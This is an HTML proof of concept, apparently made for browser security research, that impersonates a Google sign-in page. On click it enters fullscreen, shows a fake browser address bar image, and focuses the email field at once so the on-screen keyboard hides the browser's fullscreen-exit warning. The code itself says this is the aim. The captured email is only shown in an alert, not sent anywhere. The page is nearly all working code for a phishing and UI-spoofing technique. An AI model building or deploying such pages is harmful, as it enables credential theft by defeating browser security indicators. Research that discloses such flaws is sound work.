<!DOCTYPE html>
<html lang="en">
<head>
    <title>Security UI Research</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }

        /* Layar pemicu awal */
        #trigger-zone {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #fff;
            cursor: pointer;
        }

        /* Container utama yang muncul setelah fullscreen */
        #spoof-container {
            display: none;
            width: 100vw;
            height: 100vh;
            background: white;
            flex-direction: column;
        }

        /* Omnibox Palsu (spoof.jpeg) */
        #fake-omnibox {
            width: 100%;
            height: auto;
            display: block;
            border-bottom: 1px solid #e0e0e0;
        }

        /* Area Form Login */
        #login-frame {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 50px;
            background: #ffffff;
        }

        .login-box {
            width: 350px;
            text-align: center;
            padding: 20px;
        }

        input[type="email"] {
            width: 100%;
            padding: 13px;
            margin: 20px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }

        .btn-next {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            float: right;
            font-weight: 500;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="trigger-zone">
        <div style="text-align: center;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100">
            <h2 style="color: #5f6368;">Sign in to continue</h2>
            <button style="padding: 10px 20px; border: 1px solid #dadce0; background: white; border-radius: 4px;">Click to Login</button>
        </div>
    </div>

    <div id="spoof-container">
        <img id="fake-omnibox" src="spoof.jpeg" alt="Browser UI">

        <div id="login-frame">
            <div class="login-box">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
                <h1 style="font-size: 24px; margin-top: 10px;">Sign in</h1>
                <p>Use your Google Account</p>

                <input type="email" placeholder="Email or phone" id="fake_email">

                <div style="width: 100%; margin-top: 30px;">
                    <span style="color: #1a73e8; font-weight: 500; float: left; margin-top: 10px; cursor: pointer;">Forgot email?</span>
                    <button class="btn-next" onclick="alert('Data Captured: ' + document.getElementById('fake_email').value)">Next</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('trigger-zone').onclick = async () => {
            try {
                // 1. Masuk Fullscreen
                if (document.documentElement.requestFullscreen) {
                    await document.documentElement.requestFullscreen();
                } else if (document.documentElement.webkitRequestFullscreen) {
                    await document.documentElement.webkitRequestFullscreen();
                }

                // 2. Ganti UI ke mode spoofing
                document.getElementById('trigger-zone').style.display = 'none';
                document.getElementById('spoof-container').style.display = 'flex';

                // 3. Race Condition: Picu Keyboard secara instan
                // Ini akan menutupi instruksi sistem "Cara keluar"
                const inputEmail = document.getElementById('fake_email');
                inputEmail.focus();

            } catch (err) {
                console.error("Error:", err);
            }
        };
    </script>
</body>
</html>
